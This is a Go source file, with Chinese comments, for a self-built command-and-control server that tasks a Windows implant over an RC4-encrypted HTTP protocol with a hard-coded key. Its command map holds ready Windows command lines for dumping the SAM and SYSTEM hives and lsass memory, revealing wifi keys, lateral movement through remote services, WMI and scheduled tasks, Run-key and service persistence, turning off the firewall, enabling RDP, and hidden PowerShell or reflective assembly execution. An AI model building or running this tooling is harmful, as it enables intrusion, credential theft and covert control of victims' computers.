// csdev :: server.go  --  自研 C2 服务端 (Go)
//
// 替代 Python 版: 单文件编译, 无运行时依赖, 高并发。
//
// 协议 (与 kits/beacon/win_beacon.c 严格对齐):
//
//	magic = 0x4B52424B ("KBRK"), RC4 全程加密
//	握手   POST /report  body = [4B magic][4B len][RC4(host|user|arch)]
//	取任务 POST /task    body = [4B magic][4B len=0]
//	     响应           body = [4B magic][4B len][RC4(cmd)]
//	回传   POST /result  body = [4B len][RC4(output)]
//	身份   植入体通过 X-Id 头上报 host|user (不能用源地址: WinHTTP 每次
//	      请求可能使用不同源端口)
//
// 用法:
//
//	server.exe --port 8443
//	server.exe --port 8443 --host 0.0.0.0
package main

import (
	"embed"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

//go:embed ui.html
var uiFS embed.FS

const protoMagic = 0x4B52424B

var sessionKey = []byte{
	0x91, 0x3a, 0x77, 0xc4, 0x0e, 0x5b, 0xd2, 0x18,
	0x6f, 0xa3, 0x44, 0xbc, 0x27, 0xe8, 0x05, 0x9d,
}

// ---------------------------------------------------------------- RC4
func rc4(data []byte, key []byte) []byte {
	s := make([]byte, 256)
	for i := 0; i < 256; i++ {
		s[i] = byte(i)
	}
	j := 0
	for i := 0; i < 256; i++ {
		j = (j + int(s[i]) + int(key[i%len(key)])) & 0xFF
		s[i], s[j] = s[j], s[i]
	}
	out := make([]byte, len(data))
	i, j := 0, 0
	for n := 0; n < len(data); n++ {
		i = (i + 1) & 0xFF
		j = (j + int(s[i])) & 0xFF
		s[i], s[j] = s[j], s[i]
		out[n] = data[n] ^ s[(int(s[i])+int(s[j]))&0xFF]
	}
	return out
}

// ---------------------------------------------------------------- 会话
type Output struct {
	TS   int64  `json:"ts"`
	Text string `json:"text"`
}

type Session struct {
	ID       string   `json:"sid"`
	Host     string   `json:"host"`
	User     string   `json:"user"`
	Arch     string   `json:"arch"`
	Addr     string   `json:"addr"`
	Ident    string   `json:"-"`
	First    int64    `json:"first_seen"`
	Last     int64    `json:"last_seen"`
	Pending  string   `json:"pending_cmd"`
	HasTask  bool     `json:"has_task"`
	Outputs  []Output `json:"-"`
	mu       sync.Mutex
}

type State struct {
	mu      sync.RWMutex
	byID    map[string]*Session
	byIdent map[string]string
	seq     int
}

var st = &State{byID: map[string]*Session{}, byIdent: map[string]string{}}

func (s *State) getOrCreate(addr, ident string, info map[string]string) *Session {
	s.mu.Lock()
	defer s.mu.Unlock()

	if ident != "" {
		if id, ok := s.byIdent[ident]; ok {
			if sess, ok2 := s.byID[id]; ok2 {
				sess.Last = time.Now().Unix()
				return sess
			}
		}
	}
	s.seq++
	id := fmt.Sprintf("S%03d", s.seq)
	sess := &Session{
		ID: id, Host: info["host"], User: info["user"], Arch: info["arch"],
		Addr: addr, Ident: ident, First: time.Now().Unix(), Last: time.Now().Unix(),
	}
	s.byID[id] = sess
	if ident != "" {
		s.byIdent[ident] = id
	}
	logf("[+] 新会话 %s  %s\\%s  arch=%s  id=%s", id, sess.Host, sess.User, sess.Arch, ident)
	sess.pushOut(base64.StdEncoding.EncodeToString([]byte("[*] 会话建立  " + sess.Host + "\\" + sess.User + "  arch=" + sess.Arch)))
	return sess
}

func (s *State) byIdentLookup(ident string) *Session {
	s.mu.RLock()
	defer s.mu.RUnlock()
	if id, ok := s.byIdent[ident]; ok {
		return s.byID[id]
	}
	return nil
}

func (s *State) list() []*Session {
	s.mu.RLock()
	defer s.mu.RUnlock()
	out := make([]*Session, 0, len(s.byID))
	for _, v := range s.byID {
		out = append(out, v)
	}
	return out
}

func (s *Session) pushOut(text string) {
	s.mu.Lock()
	s.Outputs = append(s.Outputs, Output{TS: time.Now().UnixNano(), Text: text})
	s.mu.Unlock()
}

func (s *Session) drain(since int64) []Output {
	s.mu.Lock()
	defer s.mu.Unlock()
	out := []Output{}
	for _, o := range s.Outputs {
		if o.TS >= since {
			out = append(out, o)
		}
	}
	return out
}

// ---------------------------------------------------------------- 命令别名
// 与 Python 版一致: 绝大多数 C2 命令本质是 shell 组合, 在服务端映射,
// 植入体零改动即可支持上百条命令。
var nativePrefix = []string{"download ", "upload "}

func psexec(r string) string {
	p := strings.SplitN(r, " ", 2)
	if len(p) == 0 || p[0] == "" {
		return "echo usage: psexec <host> <cmd>"
	}
	host := p[0]
	cmd := "cmd.exe"
	if len(p) > 1 {
		cmd = p[1]
	}
	return fmt.Sprintf(`sc \\%s create csdsvc binPath= "cmd /c %s" start= demand & sc \\%s start csdsvc & timeout /t 3 >nul & sc \\%s delete csdsvc`,
		host, cmd, host, host)
}

func mapCommand(cmd string) string {
	c := strings.TrimSpace(cmd)
	if c == "" {
		return c
	}
	low := strings.ToLower(c)

	// 原生命令透传。只能用精确匹配: 若对 "ps" 用前缀匹配, psexec/psh 会被误判
	if low == "ps" || low == "exit" {
		return c
	}
	for _, p := range nativePrefix {
		if strings.HasPrefix(low, p) {
			return c
		}
	}

	parts := strings.SplitN(c, " ", 2)
	verb := strings.ToLower(parts[0])
	rest := ""
	if len(parts) > 1 {
		rest = strings.TrimSpace(parts[1])
	}
	q := `"` + rest + `"`

	switch verb {
	// ---- 文件 ----
	case "pwd":
		return "cd"
	case "ls", "ll":
		if rest != "" {
			return "dir /a " + q
		}
		return "dir /a"
	case "cat", "type":
		return "type " + q
	case "head":
		return fmt.Sprintf(`powershell -c "Get-Content '%s' -TotalCount 20"`, rest)
	case "tail":
		return fmt.Sprintf(`powershell -c "Get-Content '%s' -Tail 20"`, rest)
	case "rm":
		return "del /f /q " + q
	case "cp":
		return `copy /y "` + strings.Replace(rest, " ", `" "`, 1) + `"`
	case "mv":
		return `move /y "` + strings.Replace(rest, " ", `" "`, 1) + `"`
	case "mkdir":
		return "mkdir " + q
	case "rmdir":
		return "rmdir /s /q " + q
	case "find":
		return "dir /s /b " + q
	case "search":
		return fmt.Sprintf(`findstr /s /i /m "%s" *`, rest)
	case "hash":
		return "certutil -hashfile " + q + " SHA256"
	// ---- 进程 ----
	case "kill":
		return "taskkill /F /PID " + rest
	case "tasklist":
		return "tasklist /v"
	case "services":
		return "sc query type= service state= all"
	case "drivers":
		return "driverquery /v"
	// ---- 系统 ----
	case "whoami":
		return "whoami /all"
	case "sysinfo":
		return "systeminfo"
	case "env":
		return "set"
	case "date":
		return "date /t & time /t"
	case "uptime":
		return "net statistics workstation | findstr /i since"
	case "drives":
		return "wmic logicaldisk get name,size,freespace,caption"
	case "hotfix":
		return "wmic qfe get hotfixid,installedon"
	case "av":
		return `wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName,productState`
	// ---- 网络 ----
	case "ipconfig", "ifconfig":
		return "ipconfig /all"
	case "netstat":
		return "netstat -ano"
	case "arp":
		return "arp -a"
	case "route":
		return "route print"
	case "dns":
		return "ipconfig /displaydns"
	case "ping":
		return "ping -n 4 " + rest
	case "tracert":
		return "tracert -h 5 " + rest
	case "firewall":
		return "netsh advfirewall show allprofiles"
	// ---- 账户 / 域 ----
	case "users":
		return "net user"
	case "groups":
		return "net localgroup"
	case "shares":
		return "net share"
	case "sessions":
		return "net session"
	case "domains":
		return "net view /domain"
	case "dc":
		return "nltest /dclist:"
	case "trust":
		return "nltest /domain_trusts"
	// ---- 凭据 ----
	case "wifi":
		return "netsh wlan show profiles"
	case "wifikey":
		return fmt.Sprintf(`netsh wlan show profile "%s" key=clear`, rest)
	case "clip":
		return "powershell -c Get-Clipboard"
	case "clipset":
		return fmt.Sprintf(`powershell -c "Set-Clipboard '%s'"`, rest)
	case "savedcred":
		return "cmdkey /list"
	case "history":
		return `powershell -c "Get-Content (Get-PSReadlineOption).HistorySavePath"`
	case "sam", "hashdump":
		return `reg save HKLM\SAM %TEMP%\s.hiv /y & reg save HKLM\SYSTEM %TEMP%\y.hiv /y & dir %TEMP%\*.hiv`
	case "vault":
		return `vaultcmd /listcreds:"Windows Credentials" /all`
	case "credman":
		return "cmdkey /list"
	case "dpapi":
		return `dir /a %APPDATA%\Microsoft\Credentials`
	case "chrome":
		return `dir /b "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" 2>nul || echo not found`
	case "edge":
		return `dir /b "%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data" 2>nul || echo not found`
	case "regquery":
		if rest == "" {
			rest = `HKLM\Software`
		}
		return "reg query " + rest + " /s"
	case "regsave":
		return "reg save " + rest + " %TEMP%\\reg.hiv /y"
	case "procdump":
		return `procdump64.exe -accepteula -ma lsass.exe %TEMP%\l.dmp 2>nul || echo procdump not present`
	case "lsass":
		return `powershell -c "Get-Process lsass | Select-Object Id,ProcessName"`
	// ---- 横向移动 ----
	case "psexec":
		return psexec(rest)
	case "wmiexec":
		pp := strings.SplitN(rest, " ", 2)
		h, cmd := "", ""
		if len(pp) > 0 {
			h = pp[0]
		}
		if len(pp) > 1 {
			cmd = pp[1]
		}
		if h == "" {
			return "echo usage: wmiexec <host> <cmd>"
		}
		return fmt.Sprintf(`wmic /node:"%s" process call create "cmd.exe /c %s"`, h, cmd)
	case "atexec":
		pp := strings.SplitN(rest, " ", 2)
		h, cmd := "", ""
		if len(pp) > 0 {
			h = pp[0]
		}
		if len(pp) > 1 {
			cmd = pp[1]
		}
		if h == "" {
			return "echo usage: atexec <host> <cmd>"
		}
		return fmt.Sprintf(`schtasks /s %s /create /tn csdtask /tr "cmd /c %s" /sc once /st 00:00 & schtasks /s %s /run /tn csdtask`, h, cmd, h)
	case "netuse":
		return `net use \\` + rest + `\admin$`
	case "netdel":
		return `net use \\` + rest + `\admin$ /del`
	case "netview":
		return `net view \\` + rest
	case "share":
		return `net view \\` + rest + ` /all`
	case "loggedon", "quser":
		if rest != "" {
			return "query user /server:" + rest
		}
		return "query user"
	case "qprocess":
		if rest != "" {
			return "query process /server:" + rest
		}
		return "query process"
	case "rdp":
		return `reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & netsh advfirewall firewall set rule group="remote desktop" new enable=Yes`
	case "svc_start":
		return "sc start " + rest
	case "svc_stop":
		return "sc stop " + rest
	case "svc_query":
		return "sc query " + rest
	case "svc_delete":
		return "sc delete " + rest
	case "svc_create":
		return fmt.Sprintf(`sc create csdsvc binPath= "%s"`, rest)
	// ---- 持久化 ----
	case "persist_reg":
		return fmt.Sprintf(`reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WndSvc /t REG_SZ /d "%s" /f`, rest)
	case "persist_reg2":
		return fmt.Sprintf(`reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v WndSvc /t REG_SZ /d "%s" /f`, rest)
	case "persist_task":
		return fmt.Sprintf(`schtasks /create /tn WndSvc /tr "%s" /sc onlogon /rl highest /f`, rest)
	case "persist_task_h":
		return fmt.Sprintf(`schtasks /create /tn WndSvc /tr "%s" /sc minute /mo 30 /f`, rest)
	case "persist_svc":
		return fmt.Sprintf(`sc create WndSvc binPath= "%s" start= auto & sc start WndSvc`, rest)
	case "persist_startup":
		return fmt.Sprintf(`copy /y "%s" "%%APPDATA%%\Microsoft\Windows\Start Menu\Programs\Startup\WndSvc.exe"`, rest)
	case "persist_list":
		return `echo [Run keys] & reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" & reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" & echo [Tasks] & schtasks /query /fo LIST | findstr /i "TaskName"`
	case "persist_clean":
		return `reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WndSvc /f 2>nul & reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v WndSvc /f 2>nul & schtasks /delete /tn WndSvc /f 2>nul & sc delete WndSvc 2>nul & echo done`
	// ---- 代理 / 转发 ----
	case "portfwd":
		pp := strings.Fields(rest)
		if len(pp) < 2 {
			return "echo usage: portfwd <lport> <raddr:rport>"
		}
		ra := strings.SplitN(pp[1], ":", 2)
		rp := ""
		if len(ra) > 1 {
			rp = ra[1]
		}
		return fmt.Sprintf("netsh interface portproxy add v4tov4 listenport=%s connectaddress=%s connectport=%s", pp[0], ra[0], rp)
	case "portfwd_del":
		return "netsh interface portproxy delete v4tov4 listenport=" + rest
	case "portfwd_list":
		return "netsh interface portproxy show all"
	case "portscan":
		return fmt.Sprintf(`powershell -c "$t='%s';$h,$p=$t.Split(':');1..1024 | %%{ $c=New-Object Net.Sockets.TcpClient; try{$c.Connect($h,$_);Write-Output ('open '+$_);$c.Close()}catch{} }"`, rest)
	case "fw_off":
		return "netsh advfirewall set allprofiles state off"
	case "fw_on":
		return "netsh advfirewall set allprofiles state on"
	case "fw_list":
		return "netsh advfirewall firewall show rule name=all"
	// ---- 注入 / 执行 ----
	case "psh":
		return fmt.Sprintf(`powershell -nop -w hidden -c "%s"`, rest)
	case "psh_enc":
		return "powershell -nop -w hidden -enc " + rest
	case "rundll":
		return "rundll32 " + rest
	case "regsvr":
		return "regsvr32 /s " + rest
	case "execute_assembly":
		return fmt.Sprintf(`powershell -c "$b=[IO.File]::ReadAllBytes('%s');[Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,@())"`, rest)
	case "elevate":
		return fmt.Sprintf(`powershell -c "Start-Process -Verb RunAs -FilePath '%s'"`, rest)
	case "inject_ps":
		return fmt.Sprintf(`powershell -c "$b=[Convert]::FromBase64String('%s');[Reflection.Assembly]::Load($b) | Out-Null; Write-Output 'loaded'"`, rest)
	// ---- 操作 ----
	case "screenshot":
		return `powershell -c "Add-Type -AssemblyName System.Windows.Forms,System.Drawing;$s=[Windows.Forms.SystemInformation]::VirtualScreen;$b=New-Object Drawing.Bitmap $s.Width,$s.Height;$g=[Drawing.Graphics]::FromImage($b);$g.CopyFromScreen($s.Left,$s.Top,0,0,$b.Size);$p=$env:TEMP+'\'+[guid]::NewGuid().ToString('N').Substring(0,8)+'.png';$b.Save($p);Write-Output $p"`
	case "msg":
		return "msg * " + rest
	case "shell":
		return rest
	case "sleep":
		return "sleep " + rest
	case "clear":
		return "cls"
	// ---- 电源 ----
	case "shutdown":
		return "shutdown /s /t 0"
	case "reboot":
		return "shutdown /r /t 0"
	case "logoff":
		return "shutdown /l"
	case "lock":
		return "rundll32 user32.dll,LockWorkStation"
	}
	return c
}

// ---------------------------------------------------------------- 工具
func logf(f string, a ...interface{}) {
	log.Printf(f, a...)
}

// Windows 命令输出多为 GBK/OEM 编码。Go 标准库不含 GBK 解码器,
// 因此原样以 base64 传出, 由浏览器用 TextDecoder("gbk") 解码 —— 浏览器
// 原生支持 GBK, 无需引入第三方依赖。
func decodeOut(b []byte) string {
	return base64.StdEncoding.EncodeToString(b)
}

// 握手信息用明文 (不能走 base64: 它是 "host|user|arch" 需按 | 分割)
func decodePlain(b []byte) string {
	return string(b)
}

func writeJSON(w http.ResponseWriter, v interface{}) {
	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	json.NewEncoder(w).Encode(v)
}

// ---------------------------------------------------------------- HTTP
func handleReport(w http.ResponseWriter, r *http.Request) {
	body, _ := io.ReadAll(r.Body)
	if len(body) < 8 {
		w.Write([]byte{})
		return
	}
	magic := binary.BigEndian.Uint32(body[0:4])
	ln := binary.BigEndian.Uint32(body[4:8])
	if magic != protoMagic || ln == 0 || int(ln) > len(body)-8 {
		w.Write([]byte{})
		return
	}
	plain := rc4(body[8:8+ln], sessionKey)
	parts := strings.SplitN(decodePlain(plain), "|", 3)
	info := map[string]string{"host": "?", "user": "?", "arch": "?"}
	if len(parts) > 0 {
		info["host"] = parts[0]
	}
	if len(parts) > 1 {
		info["user"] = parts[1]
	}
	if len(parts) > 2 {
		info["arch"] = parts[2]
	}
	st.getOrCreate(r.RemoteAddr, r.Header.Get("X-Id"), info)
	w.Write([]byte("OK"))
}

func handleTask(w http.ResponseWriter, r *http.Request) {
	io.ReadAll(r.Body)
	sess := st.byIdentLookup(r.Header.Get("X-Id"))
	if sess == nil {
		w.Write([]byte{})
		return
	}
	sess.Last = time.Now().Unix()

	sess.mu.Lock()
	cmd := sess.Pending
	sess.Pending = ""
	sess.HasTask = false
	sess.mu.Unlock()

	if cmd == "" {
		w.Write([]byte{})
		return
	}
	payload := rc4([]byte(cmd), sessionKey)
	hdr := make([]byte, 8)
	binary.BigEndian.PutUint32(hdr[0:4], protoMagic)
	binary.BigEndian.PutUint32(hdr[4:8], uint32(len(payload)))
	logf("[>] %s <- %s", sess.ID, cmd)
	w.Write(append(hdr, payload...))
}

func handleResult(w http.ResponseWriter, r *http.Request) {
	body, _ := io.ReadAll(r.Body)
	if len(body) < 4 {
		w.Write([]byte{})
		return
	}
	ln := binary.BigEndian.Uint32(body[0:4])
	if ln == 0 || int(ln) > len(body)-4 {
		w.Write([]byte{})
		return
	}
	out := decodeOut(rc4(body[4:4+ln], sessionKey))
	if sess := st.byIdentLookup(r.Header.Get("X-Id")); sess != nil {
		sess.pushOut(out)
		logf("[<] %s 回传 %d 字节", sess.ID, ln)
	}
	w.Write([]byte("OK"))
}

// ---------------------------------------------------------------- Web API
func handleSessions(w http.ResponseWriter, r *http.Request) {
	now := time.Now().Unix()
	list := st.list()
	type row struct {
		SID     string `json:"sid"`
		Host    string `json:"host"`
		User    string `json:"user"`
		Arch    string `json:"arch"`
		Addr    string `json:"addr"`
		Idle    int64  `json:"idle"`
		HasTask bool   `json:"has_task"`
	}
	out := []row{}
	for _, s := range list {
		out = append(out, row{s.ID, s.Host, s.User, s.Arch, s.Addr, now - s.Last, s.HasTask})
	}
	writeJSON(w, map[string]interface{}{"ok": true, "sessions": out})
}

func handleOutput(w http.ResponseWriter, r *http.Request) {
	sid := r.URL.Query().Get("sid")
	since, _ := strconv.ParseInt(r.URL.Query().Get("since"), 10, 64)
	st.mu.RLock()
	s := st.byID[sid]
	st.mu.RUnlock()
	if s == nil {
		writeJSON(w, map[string]interface{}{"ok": false, "error": "no such session"})
		return
	}
	writeJSON(w, map[string]interface{}{"ok": true, "items": s.drain(since)})
}

func handleCommand(w http.ResponseWriter, r *http.Request) {
	var req struct {
		SID string `json:"sid"`
		Cmd string `json:"cmd"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, map[string]interface{}{"ok": false, "error": "bad json"})
		return
	}
	st.mu.RLock()
	s := st.byID[req.SID]
	st.mu.RUnlock()
	if s == nil {
		writeJSON(w, map[string]interface{}{"ok": false, "error": "no such session"})
		return
	}
	mapped := mapCommand(req.Cmd)
	s.mu.Lock()
	s.Pending = mapped
	s.HasTask = true
	s.mu.Unlock()
	s.pushOut(base64.StdEncoding.EncodeToString([]byte("> " + req.Cmd)))
	logf("[>] %s 下发: %s", req.SID, req.Cmd)
	writeJSON(w, map[string]interface{}{"ok": true, "mapped": mapped})
}

func handleUI(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" && r.URL.Path != "/index.html" {
		http.NotFound(w, r)
		return
	}
	b, err := uiFS.ReadFile("ui.html")
	if err != nil {
		http.Error(w, "ui missing", 500)
		return
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Write(b)
}

// ---------------------------------------------------------------- main
func main() {
	host := flag.String("host", "0.0.0.0", "监听地址")
	port := flag.Int("port", 8443, "监听端口")
	flag.Parse()


	mux := http.NewServeMux()
	mux.HandleFunc("/report", handleReport)
	mux.HandleFunc("/task", handleTask)
	mux.HandleFunc("/result", handleResult)
	mux.HandleFunc("/api/sessions", handleSessions)
	mux.HandleFunc("/api/output", handleOutput)
	mux.HandleFunc("/api/command", handleCommand)
	mux.HandleFunc("/", handleUI)

	addr := fmt.Sprintf("%s:%d", *host, *port)
	logf("csdev C2 服务端 (Go)")
	logf("  Web UI : http://%s/", func() string {
		if *host == "0.0.0.0" {
			return fmt.Sprintf("127.0.0.1:%d", *port)
		}
		return addr
	}())
	logf("  植入体 : http://%s/  (protocol KBRK)", addr)
	logf("  密钥   : %x", sessionKey)

	srv := &http.Server{
		Addr:              addr,
		Handler:           mux,
		ReadHeaderTimeout: 10 * time.Second,
	}
	if err := srv.ListenAndServe(); err != nil {
		fmt.Fprintln(os.Stderr, "启动失败:", err)
		os.Exit(1)
	}
}
